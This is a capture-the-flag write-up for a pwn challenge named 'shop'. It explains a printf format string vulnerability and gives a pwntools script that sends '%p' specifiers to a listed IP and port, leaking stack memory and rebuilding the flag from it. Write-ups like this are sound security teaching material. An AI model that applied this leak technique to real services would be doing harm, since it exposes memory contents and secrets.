# shop

**Category**: pwn

**Points**: 400

go on, maybe buy a playlist

`nc 195.154.231.70 4343`

## Files

- [shop](./shop)

## Solution

running the binary, you get the following output

![shop](https://i.imgur.com/5ux4MmC.png)

since your input is reflected back to you, you can assume that there is a printf format string vulnerability which can be confirmed easily by sending `%p` and getting hex values back.

this can also be confirmed by opening up the binary in ghidra and seeing that there is a `printf` call in the `main` function.

![printf](https://i.imgur.com/9ZJQ9Gl.png)

while you're in ghidra, you may notice that the flag is only loaded onto the stack when the input for the first prompt is `1337`.

![ghidra](https://i.imgur.com/FIyLB8u.png)

now, with all that information, you can simply write a python script to enter `1337` as the first input, and then use the format string vulnerability to leak the flag.

![solve](https://i.imgur.com/dC6uGCw.png)

```python
from pwn import *

if args.REMOTE:
    p = remote('195.154.231.70', 4343)
else:
    p = process("./chall")

flag = ""

p.sendlineafter(b"enter your choice:\n", b"1337")
p.sendlineafter(b"\nwhere do you want it to b sent?\n", b"%p " * 25)
p.recvuntil(b"you'll get it at:\n\n")

response = p.recv(1000)

for i, p in enumerate(response.split(b" ")):
    try:
        if not b"nil" in p:
            try:
                hex_string = p.strip().decode()[2:] # remove 0x and decode
                decoded = bytes.fromhex(hex_string) # decode hex
                reversed_hex = decoded[::-1] # reverse endianess
                print(f"{i}: {reversed_hex}")
                flag += reversed_hex.decode() # build up flag
            except BaseException as e:
                pass
    except EOFError:
        pass

log.info(flag)
```
